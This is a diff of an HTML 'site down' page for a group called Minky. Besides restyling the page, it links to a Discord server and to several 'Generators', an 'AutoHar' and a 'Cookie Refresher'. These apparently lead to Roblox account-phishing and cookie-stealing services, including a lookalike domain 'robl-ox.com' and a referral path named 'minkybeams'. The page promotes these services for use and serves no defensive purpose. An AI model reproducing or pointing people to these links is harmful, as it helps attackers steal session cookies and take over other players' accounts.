@@ -2,105 +2,110 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Minky - Site Broken</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Minky - Site Down</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
   <style>
     body {
       margin: 0;
-      height: 100vh;
+      padding: 0;
+      font-family: 'Orbitron', sans-serif;
       background: black;
       color: white;
-      font-family: Arial, sans-serif;
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
       text-align: center;
-      overflow: hidden;
+      padding: 40px 20px;
     }
 
     h1 {
       font-size: 2rem;
-      color: #fff;
-      text-shadow: 0 0 10px #fff, 0 0 20px #0ff, 0 0 40px #0ff;
       margin-bottom: 20px;
+      text-shadow: 0 0 8px white, 0 0 15px #888;
     }
 
     p {
-      font-size: 1.2rem;
+      font-size: 1.1rem;
       margin-bottom: 30px;
+      text-shadow: 0 0 8px white;
     }
 
     .btn {
-      background: transparent;
-      border: 2px solid white;
-      color: white;
-      padding: 10px 20px;
-      margin: 5px;
-      font-size: 1rem;
-      cursor: pointer;
-      border-radius: 8px;
-      transition: all 0.3s ease;
-      text-decoration: none;
       display: inline-block;
+      padding: 12px 24px;
+      margin: 10px;
+      border-radius: 12px;
+      border: 2px solid white;
+      color: black;
+      background: white;
+      font-size: 1rem;
+      text-decoration: none;
+      font-weight: bold;
+      transition: all 0.3s ease;
+      cursor: pointer;
     }
 
     .btn:hover {
-      background: white;
-      color: black;
-      box-shadow: 0 0 10px white;
-    }
-
-    .label {
-      font-size: 1.4rem;
-      margin: 40px 0 20px 0;
-      text-shadow: 0 0 10px #fff, 0 0 20px #0ff;
+      background: black;
+      color: white;
+      border-color: white;
+      transform: scale(1.05);
+      box-shadow: 0 0 12px white;
     }
 
     .category {
-      margin: 20px 0;
+      margin-top: 40px;
+      width: 100%;
     }
 
     .category h2 {
-      margin-bottom: 10px;
-      font-size: 1.2rem;
-      text-shadow: 0 0 10px #fff, 0 0 15px #0ff;
+      font-size: 1.5rem;
+      margin-bottom: 15px;
+      text-shadow: 0 0 8px white, 0 0 20px #aaa;
     }
 
-    .buttons {
+    .category .buttons {
       display: flex;
-      flex-wrap: wrap;
       justify-content: center;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+
+    /* Smooth scroll */
+    html {
+      scroll-behavior: smooth;
     }
   </style>
 </head>
 <body>
-  <h1>Minky</h1>
-  <p>The Site Is Broken Right Now. We're Working To Fix It ASAP.<br>
-     Stay In The Discord Server — We Will Announce Everyone When It's Fixed.</p>
-  <a href="https://discord.gg/PV3vVfc7s7" class="btn">Join Discord</a>
+  <h1>⚡ Minky</h1>
+  <p>The Site Is Broken Right Now.<br> We're Working To Fix It ASAP.<br>
+     Stay In The Discord Server, We Will Announce When It's Fixed.</p>
+  <a class="btn" href="https://discord.gg/PV3vVfc7s7" target="_blank">Join Discord</a>
 
-  <div class="label">Also here are the sites if you need it</div>
+  <p style="margin-top:50px; text-shadow:0 0 10px white;">Also here are the sites if you need it:</p>
 
   <div class="category">
     <h2>Generators</h2>
     <div class="buttons">
-      <a href="https://logged.tg/auth/minkybeams" class="btn">Injuries</a>
-      <a href="https://immortal.st/?code=NjU5MTUxMzEwNzc3ODI3Nzc1MV85OTcxODE4OTgyODA4ODQwMjQ=" class="btn">Immortal</a>
-      <a href="https://robl-ox.com/dash/?code=TZI3JD71" class="btn">Wave</a>
+      <a class="btn" href="https://logged.tg/auth/minkybeams" target="_blank">Injuries</a>
+      <a class="btn" href="https://immortal.st/?code=NjU5MTUxMzEwNzc3ODI3Nzc1MV85OTcxODE4OTgyODA4ODQwMjQ=" target="_blank">Immortal</a>
+      <a class="btn" href="https://robl-ox.com/dash/?code=TZI3JD71" target="_blank">Wave</a>
     </div>
   </div>
 
   <div class="category">
     <h2>AutoHar</h2>
     <div class="buttons">
-      <a href="https://bloxhub.st/generator/Minky" class="btn">AutoHar</a>
+      <a class="btn" href="https://bloxhub.st/generator/Minky" target="_blank">AutoHar</a>
     </div>
   </div>
 
   <div class="category">
     <h2>Tools</h2>
     <div class="buttons">
-      <a href="https://www.logged.tg/tools/refresher" class="btn">Cookie Refresher</a>
+      <a class="btn" href="https://www.logged.tg/tools/refresher" target="_blank">Cookie Refresher</a>
     </div>
   </div>
 </body>
